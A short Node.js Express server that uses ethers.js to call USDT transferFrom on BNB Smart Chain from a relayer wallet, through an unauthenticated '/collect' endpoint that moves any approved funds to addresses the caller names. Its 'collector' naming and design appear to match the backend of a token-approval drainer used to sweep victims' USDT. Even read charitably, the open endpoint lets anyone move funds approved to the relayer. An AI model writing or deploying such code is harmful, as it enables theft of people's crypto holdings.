require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");

const app = express();
app.use(express.json());

// BSC RPC
const provider = new ethers.JsonRpcProvider(
  "https://bsc-dataseed.binance.org/"
);

// RELAYER WALLET
const wallet = new ethers.Wallet(
  process.env.PRIVATE_KEY,
  provider
);

// USDT Contract
const USDT = "0x55d398326f99059fF775485246999027B3197955";

const ABI = [
  "function transferFrom(address from,address to,uint256 amount) public returns(bool)"
];

const token = new ethers.Contract(USDT, ABI, wallet);

// ✅ STATUS ROUTE (browser open → JSON show)
app.get("/", (req, res) => {
  res.json({
    status: true,
    relayer: wallet.address,
    collector: process.env.COLLECTOR
  });
});

// ✅ RELAYER ENDPOINT
app.post("/collect", async (req, res) => {
  try {
    const { from, to, amount } = req.body;

    if (!from || !to || !amount)
      return res.status(400).json({ success: false });

    console.log("Transfer request:", req.body);

    const tx = await token.transferFrom(from, to, amount);

    console.log("TX SENT:", tx.hash);

    await tx.wait();

    res.json({
      success: true,
      hash: tx.hash
    });

  } catch (err) {
    console.log(err);
    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

app.listen(3000, () =>
  console.log("✅ Relayer running on port 3000")
);
